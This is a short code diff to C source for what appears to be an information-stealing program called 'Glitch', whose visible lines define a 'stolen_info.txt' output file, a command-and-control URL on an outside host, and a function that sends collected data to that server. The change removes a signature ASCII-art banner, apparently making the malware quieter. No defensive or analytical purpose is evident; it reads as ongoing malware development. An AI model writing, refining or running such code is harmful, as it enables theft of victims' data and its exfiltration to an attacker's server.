@@ -11,16 +11,6 @@
 #define INFO_FILE "stolen_info.txt"
 #define C2_URL "http://papash3ll.com/data"
 
-// ASCII art for "Glitch"
-void print_ascii_art() {
-    printf("  ____ _ _ _       _       \n");
-    printf(" / ___(_) (_) __ _| | ___  \n");
-    printf("| |  _| | | |/ _` | |/ _ \\ \n");
-    printf("| |_| | | | | (_| | |  __/ \n");
-    printf(" \\____|_|_|_|\\__,_|_|\\___| \n");
-    printf("        Created by the one and only Bloatware.\n\n");
-}
-
 // Function to check if a file exists
 int file_exists(const char *path) {
     struct stat buffer;
@@ -93,8 +83,6 @@ void send_info_to_c2_server() {
 }
 
 int main() {
-    // Print the ASCII art for Glitch
-    print_ascii_art();
 
     // Create the info file
     FILE *fp = fopen(INFO_FILE, "w");
